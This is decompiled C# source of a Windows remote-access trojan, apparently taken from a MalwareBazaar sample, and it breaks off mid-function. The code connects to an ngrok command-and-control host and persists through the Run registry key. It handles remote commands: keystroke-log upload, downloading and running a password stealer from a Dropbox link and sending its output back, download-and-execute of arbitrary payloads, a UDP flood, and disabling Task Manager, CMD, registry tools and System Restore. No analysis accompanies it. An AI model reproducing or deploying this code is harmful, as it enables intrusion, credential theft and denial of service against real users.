// Decompiled with JetBrains decompiler
// Type: @Ә
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9B8B32AC-9182-49CC-A749-378710D3E2D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-d9a3bb0d20174bb74be71d0921b7998d71785e985e0a0fb2e02916a7402f08f8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using w.My;

public class \u0040Ә
{
  public static string \u0040ӓ;
  public static string \u0040Ӕ;
  public static int \u0040ӕ;
  public static bool \u0040Ӗ;
  private static byte[] \u0040ӗ = new byte[5121];
  public static bool \u0040Ә = Conversions.ToBoolean("False");
  public static TcpClient \u0040ә = (TcpClient) null;
  public static bool \u0040Ӛ = false;
  public static string \u0040ӛ = "TEMP";
  public static string \u0040Ӝ = "Windows РґРёСЂРµРєС‚РѕСЂРёСЏ2.exe";
  public static Computer \u0040ӝ = new Computer();
  public static FileStream \u0040Ӟ;
  private static string \u0040ӟ = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԋ(\u0040Ә.\u0040Ӡ)))));
  public static string \u0040Ӡ = "2.tcp.ngrok.io";
  public static bool \u0040ӡ = Conversions.ToBoolean("True");
  public static bool \u0040Ӣ = Conversions.ToBoolean("False");
  public static bool \u0040ӣ = Conversions.ToBoolean("False");
  public static \u0040ә \u0040Ӥ = (\u0040ә) null;
  private static string \u0040ӥ = "";
  public static FileInfo \u0040Ӧ = new FileInfo(Assembly.GetEntryAssembly().Location);
  private static MemoryStream \u0040ӧ = new MemoryStream();
  public static object \u0040Ө = (object) null;
  public static int \u0040ө = 0;
  public static string \u0040Ӫ = "18982";
  public static object \u0040ӫ = (object) null;
  public static string \u0040Ӭ = "87c8bc201993ff0d075633641ce61ad3";
  public static string \u0040ӭ = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  public static string \u0040Ӯ = "20";
  public static string \u0040ӯ = "SGFjS2Vk";
  public static string \u0040Ӱ = "im523";
  public static string \u0040ӱ = "|'|'|";
  public static bool \u0040Ӳ = Conversions.ToBoolean("False");
  public static string \u0040ӳ = "Exsample.exe";
  public static bool \u0040Ӵ = Conversions.ToBoolean("False");
  public static bool \u0040ӵ = Conversions.ToBoolean("False");
  public static string \u0040Ӷ = "svchost.exe";
  public static bool \u0040ӷ = Conversions.ToBoolean("False");
  public static \u0040Ӛ \u0040Ӹ = (\u0040Ӛ) null;

  [DebuggerNonUserCode]
  public \u0040Ә()
  {
  }

  private static void \u0040ӹ(object _param0) => \u0040Ә.\u0040ԓ((byte[]) _param0);

  private static void \u0040Ӻ(object _param0, SessionEndingEventArgs _param1) => \u0040Ә.\u0040ԇ();

  public static string \u0040ӻ()
  {
    string str1;
    try
    {
      IntPtr num = \u0040Ә.\u0040Ӿ();
      if (num == IntPtr.Zero)
        return "";
      string str2 = Strings.Space(checked (\u0040Ә.\u0040ԁ((long) num) + 1));
      \u0040Ә.\u0040Ԁ(num, ref str2, str2.Length);
      str1 = \u0040Ә.\u0040Ԉ(ref str2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = "";
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string \u0040Ӽ(ref byte[] _param0) => Encoding.UTF8.GetString(_param0);

  public static bool \u0040ӽ()
  {
    try
    {
      int num1 = 0;
      do
      {
        int num2 = (int) checked ((short) num1);
        string str1 = Strings.Space(100);
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        if (\u0040Ә.\u0040Ԃ((short) num2, ref local1, 100, ref local2, 100))
          return true;
        checked { ++num1; }
      }
      while (num1 <= 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return false;
  }

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr \u0040Ӿ();

  [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ӿ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    ref int _param3,
    ref int _param4,
    ref int _param5,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param6,
    int _param7);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040Ԁ(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040ԁ(long _param0);

  [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool \u0040Ԃ(
    short _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    int _param2,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param3,
    int _param4);

  private static bool \u0040ԃ(FileInfo _param0, FileInfo _param1)
  {
    if (Operators.CompareString(_param0.Name.ToLower(), _param1.Name.ToLower(), false) != 0)
      return false;
    DirectoryInfo directoryInfo1 = _param0.Directory;
    DirectoryInfo directoryInfo2 = _param1.Directory;
    while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
    {
      directoryInfo1 = directoryInfo1.Parent;
      directoryInfo2 = directoryInfo2.Parent;
      if (directoryInfo1 == null & directoryInfo2 == null)
        return true;
      if (directoryInfo1 == null || directoryInfo2 == null)
        return false;
    }
    return false;
  }

  public static bool \u0040Ԅ()
  {
    \u0040Ә.\u0040Ӛ = false;
    Thread.Sleep(2000);
    lock (\u0040Ә.\u0040Ӧ)
    {
      try
      {
        if (\u0040Ә.\u0040ә != null)
        {
          try
          {
            \u0040Ә.\u0040ә.Close();
            \u0040Ә.\u0040ә = (TcpClient) null;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        try
        {
          \u0040Ә.\u0040ӧ.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0040Ә.\u0040ӧ = new MemoryStream();
        \u0040Ә.\u0040ә = new TcpClient();
        \u0040Ә.\u0040ә.ReceiveBufferSize = 204800;
        \u0040Ә.\u0040ә.SendBufferSize = 204800;
        \u0040Ә.\u0040ә.Client.SendTimeout = 10000;
        \u0040Ә.\u0040ә.Client.ReceiveTimeout = 10000;
        NewLateBinding.LateCall((object) \u0040Ә.\u0040ә, (System.Type) null, "Connect", new object[2]
        {
          RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԋ(\u0040Ә.\u0040Ӡ)))),
          (object) Conversions.ToInteger(\u0040Ә.\u0040Ӫ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        \u0040Ә.\u0040ӟ = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԋ(\u0040Ә.\u0040Ӡ)));
        \u0040Ә.\u0040Ӛ = true;
        \u0040Ә.\u0040ԝ(\u0040Ә.\u0040Ԕ());
        try
        {
          string str1;
          string str2;
          if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ("vn", (object) "")), (object) "", false))
          {
            str2 = str1 + \u0040Ә.\u0040ԅ(ref \u0040Ә.\u0040ӯ) + "\r\n";
          }
          else
          {
            string str3 = str1;
            string str4 = Conversions.ToString(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ("vn", (object) "")));
            string str5 = \u0040Ә.\u0040ԅ(ref str4);
            str2 = str3 + str5 + "\r\n";
          }
          string str6 = str2 + \u0040Ә.\u0040ӟ + ":" + \u0040Ә.\u0040Ӫ + "\r\n" + \u0040Ә.\u0040ӛ + "\r\n" + \u0040Ә.\u0040Ӝ + "\r\n" + Conversions.ToString(\u0040Ә.\u0040ӡ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040Ӣ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040ӣ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040Ә) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040Ӳ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040ӵ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040Ӵ) + "\r\n" + Conversions.ToString(\u0040Ә.\u0040ӷ);
          \u0040Ә.\u0040ԝ("inf" + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040Ԉ(ref str6));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0040Ә.\u0040Ӛ = false;
        ProjectData.ClearProjectError();
      }
    }
    return \u0040Ә.\u0040Ӛ;
  }

  public static string \u0040ԅ(ref string _param0)
  {
    byte[] numArray = Convert.FromBase64String(_param0);
    return \u0040Ә.\u0040Ӽ(ref numArray);
  }

  public static void \u0040Ԇ(string _param0)
  {
    try
    {
      \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey("Software\\" + \u0040Ә.\u0040Ӭ, true).DeleteValue(_param0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0040ԇ() => \u0040Ә.\u0040Ԛ(0);

  public static string \u0040Ԉ(ref string _param0) => Convert.ToBase64String(\u0040Ә.\u0040Ԝ(ref _param0));

  public static object \u0040ԉ(string _param0, object _param1)
  {
    object obj;
    try
    {
      obj = \u0040Ә.\u0040ӝ.Registry.CurrentUser.OpenSubKey("Software\\" + \u0040Ә.\u0040Ӭ).GetValue(_param0, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(_param1))));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = _param1;
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static string \u0040Ԋ()
  {
    string str1;
    try
    {
      string str2 = Interaction.Environ("SystemDrive") + "\\";
      string str3 = (string) null;
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      string str4 = (string) null;
      int Number;
      \u0040Ә.\u0040ӿ(ref str2, ref str3, num1, ref Number, ref num2, ref num3, ref str4, 0);
      str1 = Conversion.Hex(Number);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.SetProjectError(ex);
      str1 = "ERR";
      ProjectData.ClearProjectError();
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static object \u0040ԋ(string _param0)
  {
    string[] strArray = Strings.Split(_param0, ",");
    if (\u0040Ә.\u0040ө >= strArray.Length)
      \u0040Ә.\u0040ө = 0;
    return (object) strArray[\u0040Ә.\u0040ө];
  }

  [DllImport("user32", EntryPoint = "BlockInput", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int \u0040Ԍ(int _param0);

  [DllImport("user32", EntryPoint = "SwapMouseButton", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0040ԍ(long _param0);

  [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern void \u0040Ԏ(int _param0, uint _param1, uint _param2, int _param3);

  [DllImport("user32", EntryPoint = "SetWindowPos", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0040ԏ(
    int _param0,
    int _param1,
    int _param2,
    int _param3,
    int _param4,
    int _param5,
    int _param6);

  [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0040Ԑ(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
    long _param2,
    long _param3);

  [DllImport("KERNEL32.DLL", EntryPoint = "Beep")]
  public static extern void \u0040ԑ(int _param0, int _param1);

  public static void \u0040Ԓ(string _param0) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", true).SetValue("Start Page", (object) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040ԓ(byte[] _param0)
  {
    string[] strArray1 = Strings.Split(\u0040Ә.\u0040Ӽ(ref _param0), \u0040Ә.\u0040ӱ);
    try
    {
      string Left1 = strArray1[0];
      string Left2 = Left1;
      if (Operators.CompareString(Left2, "nwpr", false) == 0)
        Process.Start(strArray1[1]);
      else if (Operators.CompareString(Left2, "site", false) == 0)
        \u0040Ә.\u0040ԝ("site");
      else if (Operators.CompareString(Left2, "fun", false) == 0)
        \u0040Ә.\u0040ԝ("fun");
      else if (Operators.CompareString(Left2, "IEhome", false) == 0)
        \u0040Ә.\u0040Ԓ(strArray1[1]);
      else if (Operators.CompareString(Left2, "shutdowncomputer", false) == 0)
        Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide);
      else if (Operators.CompareString(Left2, "restartcomputer", false) == 0)
        Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide);
      else if (Operators.CompareString(Left2, "logoff", false) == 0)
        Interaction.Shell("shutdown -l -t 00", AppWinStyle.Hide);
      else if (Operators.CompareString(Left2, "ErorrMsg", false) == 0)
      {
        string Left3 = strArray1[1];
        MessageBoxIcon icon;
        if (Operators.CompareString(Left3, "1", false) == 0)
          icon = MessageBoxIcon.Asterisk;
        else if (Operators.CompareString(Left3, "2", false) == 0)
          icon = MessageBoxIcon.Question;
        else if (Operators.CompareString(Left3, "3", false) == 0)
          icon = MessageBoxIcon.Exclamation;
        else if (Operators.CompareString(Left3, "4", false) == 0)
          icon = MessageBoxIcon.Hand;
        string Left4 = strArray1[2];
        MessageBoxButtons buttons;
        if (Operators.CompareString(Left4, "1", false) == 0)
          buttons = MessageBoxButtons.YesNo;
        else if (Operators.CompareString(Left4, "2", false) == 0)
          buttons = MessageBoxButtons.YesNoCancel;
        else if (Operators.CompareString(Left4, "3", false) == 0)
          buttons = MessageBoxButtons.OK;
        else if (Operators.CompareString(Left4, "4", false) == 0)
          buttons = MessageBoxButtons.OKCancel;
        else if (Operators.CompareString(Left4, "5", false) == 0)
          buttons = MessageBoxButtons.RetryCancel;
        else if (Operators.CompareString(Left4, "6", false) == 0)
          buttons = MessageBoxButtons.AbortRetryIgnore;
        int num = (int) MessageBox.Show(strArray1[4], strArray1[3], buttons, icon);
      }
      else if (Operators.CompareString(Left2, "peech", false) == 0)
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
        object[] objArray1 = new object[1];
        object[] objArray2 = objArray1;
        string[] strArray2 = strArray1;
        string[] strArray3 = strArray2;
        int index1 = 1;
        int index2 = index1;
        string str = strArray3[index2];
        objArray2[0] = (object) str;
        object[] objArray3 = objArray1;
        object[] Arguments = objArray3;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          strArray2[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
      }
      else if (Operators.CompareString(Left2, "BepX", false) == 0)
        \u0040Ә.\u0040ԑ(checked ((int) Math.Round(Conversion.Val(strArray1[1]))), checked ((int) Math.Round(Conversion.Val(strArray1[2]))));
      else if (Operators.CompareString(Left2, "piano", false) == 0)
        \u0040Ә.\u0040ԑ(checked ((int) Math.Round(Conversion.Val(strArray1[1]))), 300);
      else if (Operators.CompareString(Left2, "OpenCD", false) == 0)
      {
        string str1 = "set CDAudio door open";
        ref string local1 = ref str1;
        string str2 = "";
        ref string local2 = ref str2;
        \u0040Ә.\u0040Ԑ(ref local1, ref local2, 0L, 0L);
      }
      else if (Operators.CompareString(Left2, "CloseCD", false) == 0)
      {
        string str3 = "set CDAudio door closed";
        ref string local3 = ref str3;
        string str4 = "";
        ref string local4 = ref str4;
        \u0040Ә.\u0040Ԑ(ref local3, ref local4, 0L, 0L);
      }
      else if (Operators.CompareString(Left2, "DisableKM", false) == 0)
        \u0040Ә.\u0040Ԍ(1);
      else if (Operators.CompareString(Left2, "EnableKM", false) == 0)
        \u0040Ә.\u0040Ԍ(0);
      else if (Operators.CompareString(Left2, "TurnOffMonitor", false) == 0)
        \u0040Ә.\u0040Ԏ(-1, 274U, 61808U, 2);
      else if (Operators.CompareString(Left2, "TurnOnMonitor", false) == 0)
        \u0040Ә.\u0040Ԏ(-1, 274U, 61808U, -1);
      else if (Operators.CompareString(Left2, "NormalMouse", false) == 0)
        \u0040Ә.\u0040ԍ(0L);
      else if (Operators.CompareString(Left2, "ReverseMouse", false) == 0)
        \u0040Ә.\u0040ԍ(256L);
      else if (Operators.CompareString(Left2, "DisableCMD", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "1", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "EnableCMD", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "0", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "DisableRegistry", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "EnableRegistry", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "0", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "DisableRestore", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "EnableRestore", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "0", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "DisableTaskManager", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "EnableTaskManager", false) == 0)
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "0", RegistryValueKind.DWord);
      else if (Operators.CompareString(Left2, "CursorShow", false) == 0)
        Cursor.Show();
      else if (Operators.CompareString(Left2, "CursorHide", false) == 0)
        Cursor.Hide();
      else if (Operators.CompareString(Left2, "sendmusicplay", false) == 0)
      {
        System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
        Thread.Sleep(1000);
        MyProject.Computer.Audio.Stop();
        MyProject.Computer.Audio.Play(Path.GetTempPath() + strArray1[1], AudioPlayMode.Background);
      }
      else if (Operators.CompareString(Left2, "OpenSite", false) == 0)
        Process.Start(strArray1[1]);
      else if (Operators.CompareString(Left2, "dos", false) == 0)
        \u0040Ә.\u0040ԝ("dos");
      else if (Operators.CompareString(Left2, "udp", false) == 0)
      {
        \u0040Ә.\u0040ԝ("udp");
        \u0040Ә.\u0040ӓ = strArray1[1];
        \u0040Ә.\u0040Ӕ = strArray1[2];
        \u0040Ә.\u0040ӕ = Conversions.ToInteger(strArray1[3]);
        \u0040Ә.\u0040Ӗ = true;
        try
        {
          while (true)
          {
            if (\u0040Ә.\u0040Ӗ)
            {
              try
              {
                new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(new byte[4096], (EndPoint) new IPEndPoint(IPAddress.Parse(\u0040Ә.\u0040ӓ), Conversions.ToInteger(\u0040Ә.\u0040Ӕ)));
                Thread.Sleep(\u0040Ә.\u0040ӕ);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else
              goto label_124;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(Left2, "udpstp", false) == 0)
        \u0040Ә.\u0040Ӗ = false;
      else if (Operators.CompareString(Left2, "pingstop", false) == 0)
      {
        Interaction.Shell("taskkill /F /IM PING.EXE", AppWinStyle.Hide);
      }
      else
      {
        if (Operators.CompareString(Left2, "ll", false) == 0)
        {
          \u0040Ә.\u0040Ӛ = false;
          return;
        }
        if (Operators.CompareString(Left2, "kl", false) == 0)
        {
          \u0040Ә.\u0040ԝ("kl" + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040Ԉ(ref \u0040Ә.\u0040Ӥ.\u0040Ӗ));
          return;
        }
        if (Operators.CompareString(Left2, "pas", false) == 0)
        {
          try
          {
            string str = Interaction.Environ("temp") + "/pass.exe";
            if (!System.IO.File.Exists(str))
            {
              try
              {
                new WebClient().DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", str);
                Process.Start(str);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else
              goto label_110;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
label_110:
          try
          {
            string str = System.IO.File.ReadAllText(Interaction.Environ("temp") + "/temp.txt");
            \u0040Ә.\u0040ԝ("pas" + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040Ԉ(ref str));
            return;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            return;
          }
        }
        else
        {
          if (Operators.CompareString(Left2, "ll", false) == 0)
          {
            \u0040Ә.\u0040Ӛ = false;
            return;
          }
          if (Operators.CompareString(Left2, "kl", false) == 0)
          {
            \u0040Ә.\u0040ԝ("kl" + \u0040Ә.\u0040ӱ + \u0040Ә.\u0040Ԉ(ref \u0040Ә.\u0040Ӥ.\u0040Ӗ));
            return;
          }
          if (Operators.CompareString(Left2, "prof", false) == 0)
          {
            string Left5 = strArray1[1];
            if (Operators.CompareString(Left5, "~", false) == 0)
            {
              \u0040Ә.\u0040ԟ(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              return;
            }
            if (Operators.CompareString(Left5, "!", false) == 0)
            {
              \u0040Ә.\u0040ԟ(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              \u0040Ә.\u0040ԝ(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ), RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԉ(strArray1[1], (object) ""))))));
              return;
            }
            if (Operators.CompareString(Left5, "@", false) != 0)
              return;
            \u0040Ә.\u0040Ԇ(strArray1[2]);
            return;
          }
        }
      }
label_124:
      if (Operators.CompareString(Left1, "rn", false) == 0)
      {
        byte[] bytes;
        if (strArray1[2][0] == '\u001F')
        {
          try
          {
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ).Length;
            memoryStream.Write(_param0, length, checked (_param0.Length - length));
            bytes = \u0040Ә.\u0040ԡ(memoryStream.ToArray());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Execute ERROR");
            \u0040Ә.\u0040ԝ("bla");
            ProjectData.ClearProjectError();
            return;
          }
        }
        else
        {
          WebClient webClient = new WebClient();
          try
          {
            bytes = webClient.DownloadData(strArray1[2]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Download ERROR");
            \u0040Ә.\u0040ԝ("bla");
            ProjectData.ClearProjectError();
            return;
          }
        }
        \u0040Ә.\u0040ԝ("bla");
        string str = Path.GetTempFileName() + "." + strArray1[1];
        try
        {
          System.IO.File.WriteAllBytes(str, bytes);
          Process.Start(str);
          \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Executed As " + new FileInfo(str).Name);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Exception exception = ex;
          \u0040Ә.\u0040ԝ("MSG" + \u0040Ә.\u0040ӱ + "Execute ERROR " + exception.Message);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        string Left6 = Left1;
        if (Operators.CompareString(Left6, "inv", false) == 0)
        {
          byte[] numArray = (byte[]) \u0040Ә.\u0040ԉ(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            \u0040Ә.\u0040ԝ("pl" + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ + strArray1[2] + \u0040Ә.\u0040ӱ).Length;
              memoryStream.Write(_param0, length, checked (_param0.Length - length));
              numArray = \u0040Ә.\u0040ԡ(memoryStream.ToArray());
              \u0040Ә.\u0040ԟ(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            \u0040Ә.\u0040ԝ("pl" + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԙ(numArray, "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
            {
              (object) \u0040Ә.\u0040ӟ
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
            {
              (object) \u0040Ә.\u0040Ӫ
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !\u0040Ә.\u0040Ӛ, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
        else if (Operators.CompareString(Left6, "ret", false) == 0)
        {
          byte[] numArray = (byte[]) \u0040Ә.\u0040ԉ(strArray1[1], (object) new byte[0]);
          if (strArray1[2].Length < 10 & numArray.Length == 0)
          {
            \u0040Ә.\u0040ԝ("pl" + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[2].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ).Length;
              memoryStream.Write(_param0, length, checked (_param0.Length - length));
              numArray = \u0040Ә.\u0040ԡ(memoryStream.ToArray());
              \u0040Ә.\u0040ԟ(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            \u0040Ә.\u0040ԝ("pl" + \u0040Ә.\u0040ӱ + strArray1[1] + \u0040Ә.\u0040ӱ + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ԙ(numArray, "A"))));
            string[] strArray4 = new string[5]
            {
              "ret",
              \u0040Ә.\u0040ӱ,
              strArray1[1],
              \u0040Ә.\u0040ӱ,
              null
            };
            string[] strArray5 = strArray4;
